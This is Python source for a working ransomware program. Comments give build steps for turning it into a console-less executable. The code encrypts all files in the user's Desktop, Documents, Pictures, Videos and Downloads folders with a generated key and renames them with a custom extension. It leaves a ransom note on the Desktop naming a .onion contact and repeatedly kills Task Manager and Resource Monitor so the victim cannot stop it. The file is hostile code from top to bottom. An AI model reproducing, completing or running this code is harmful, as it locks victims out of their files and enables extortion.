# Always encryption %userprofile%/Desktop, %userprofile%/Documents, %userprofile%/Pictures, %userprofile%/Videos, %userprofile%/Downloads
# No console update v1.0.2+
# pyinstaller --onefile --icon=NONE --noconsole abc_ransomware_decrypt_v0_1_2_noconsole_update.py
# Crypt file: *.*.crypt000as21p

import time, os, psutil, sys
from cryptography.fernet import Fernet

def encrypt_file(file_path, key):
    if not os.path.isfile(file_path) or file_path.endswith('.crypt000as21p'):
        return
        
    try:
        with open(file_path, 'rb') as file:
            data = file.read()
        fernet = Fernet(key)
        encrypted_data = fernet.encrypt(data)
        with open(file_path, 'wb') as file:
            file.write(encrypted_data)
        
        new_file_path = file_path + '.crypt000as21p'
        os.rename(file_path, new_file_path)

    except Exception as e:
        print

def main():
    # 1. Tạo khóa mã hóa
    key = Fernet.generate_key()
    key_string = key.decode()
    
    # 2. Lấy đường dẫn thư mục %temp% và định nghĩa file lưu key
    # os.environ.get('TEMP') sẽ trả về đường dẫn dạng C:\Users\Tên_User\AppData\Local\Temp
    temp_dir = os.environ.get('TEMP')
    key_file_path = os.path.join(temp_dir, "key_abc001.txt")
    
    try:
        # Ghi khóa vào file trong thư mục %temp%
        with open(key_file_path, 'w', encoding='utf-8') as key_file:
            key_file.write(key_string)
    except Exception as e:
        print
    
    # 3. Lấy đường dẫn thư mục user hiện tại (%userprofile%) để mã hóa
    user_profile = os.path.expanduser("~")
    target_paths = [
        os.path.join(user_profile, "Desktop"),
        os.path.join(user_profile, "Documents"),
        os.path.join(user_profile, "Pictures"),
        os.path.join(user_profile, "Videos"),
        os.path.join(user_profile, "Downloads")
    ]
    
    # Duyệt qua từng thư mục trong danh sách để mã hóa
    for path in target_paths:
        print(f"\nStart scan folders: {path}")
        if os.path.isdir(path):
            for root, dirs, files in os.walk(path):
                for file in files:
                    full_path = os.path.join(root, file)
                    encrypt_file(full_path, key)
        else:
            print
        
    with open(os.path.join(user_profile, "Desktop", "readme.txt"), "w", encoding="utf-8") as info_file:
        info_file.write("Your files have been encrypted by Hacker Lod\n")
        info_file.write("To recover your files, please follow the instructions below:\n")
        info_file.write("1. Find the encryption key in the file key_abc001.txt very hard.\n")
        info_file.write("2. Pay the 1$ ransom and contact us with Tor Browser at 2091pad90as2ejclcsaczlclad8201lfrjfso210fds.onion and email 3P02made9102@2091pad90as2ejclcsaczlclad8201lfrjfso210fds.onion\n")
        info_file.write("3. After payment, we will send you the decryption program to recover your files.\n")
        info_file.write("Note: Do not try to recover your files by yourself or use third-party software, as it may lead to permanent data loss.\n")
        info_file.write("If you have any questions, please contact us immediately.\n")
            
    while True:
        for process in psutil.process_iter(['name']):
            if process.info['name'] and process.info['name'].lower() in ['taskmgr.exe', 'resmon.exe']:
                print("Process detected: " + process.info['name'])
                process.kill()
        time.sleep(5)
        
    
if __name__ == "__main__":
    main()
